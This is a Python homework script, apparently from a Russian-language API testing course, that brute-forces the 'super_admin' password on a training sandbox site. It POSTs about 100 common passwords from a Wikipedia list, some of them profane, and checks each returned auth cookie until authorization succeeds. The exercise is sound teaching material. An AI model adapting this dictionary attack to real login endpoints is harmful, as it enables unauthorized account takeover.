#Домашнее задание №9: Подбор пароля

"""
Скрипт для подбора пароля super_admin.

1. Берёт пароль из списка
2. Отправляет POST-запрос с login и password
3. Получает cookie auth_cookie
4. Проверяет cookie через check_auth_cookie
5. Если "You are authorized" — пароль найден
"""
import requests

LOGIN = "super_admin"
PASSWORDS_URL = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
CHECK_URL = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

# Список паролей из Википедии
PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "696969", "shadow", "master", "666666",
    "qwertyuiop", "123321", "mustang", "1234567890", "michael",
    "654321", "pussy", "superman", "1qaz2wsx", "7777777",
    "fuckyou", "121212", "000000", "qazwsx", "123qwe",
    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm",
    "asdfgh", "hunter", "buster", "soccer", "harley",
    "batman", "andrew", "tigger", "sunshine", "iloveyou",
    "fuckme", "2000", "charlie", "robert", "thomas",
    "hockey", "ranger", "daniel", "starwars", "klaster",
    "112233", "george", "asshole", "computer", "michelle",
    "jessica", "pepper", "1111", "zxcvbn", "555555",
    "11111111", "131313", "freedom", "777777", "pass",
    "fuck", "maggie", "159753", "aaaaaa", "ginger",
    "princess", "joshua", "cheese", "amanda", "summer",
    "love", "ashley", "6969", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321",
    "dallas", "austin", "thunder", "taylor", "matrix",
]


def main():
    """Основная функция скрипта."""
    print(f"Подбираем пароль для login = {LOGIN}")
    print(f"Всего паролей: {len(PASSWORDS)}")
    print("=" * 60)

    for i, password in enumerate(PASSWORDS, 1):
        # Шаг 1: POST-запрос с login и password
        response = requests.post(
            PASSWORDS_URL,
            data={"login": LOGIN, "password": password},
            timeout=5,
        )

        # Получаем cookie auth_cookie
        auth_cookie = response.cookies.get("auth_cookie")

        if not auth_cookie:
            print(f"  [{i}] {password} — cookie не получена")
            continue

        # Шаг 2: Проверяем cookie
        check_response = requests.get(
            CHECK_URL,
            cookies={"auth_cookie": auth_cookie},
            timeout=5,
        )

        result = check_response.text

        # Шаг 3: Проверяем результат
        if "You are authorized" in result:
            print("=" * 60)
            print(f" ПАРОЛЬ НАЙДЕН!")
            print(f" Пароль: {password}")
            print(f" Ответ: {result}")
            print("=" * 60)
            return password

        # Прогресс
        print(f"  [{i}/{len(PASSWORDS)}] {password} — не подходит")

    print(" Пароль не найден")
    return None


if __name__ == "__main__":
    main()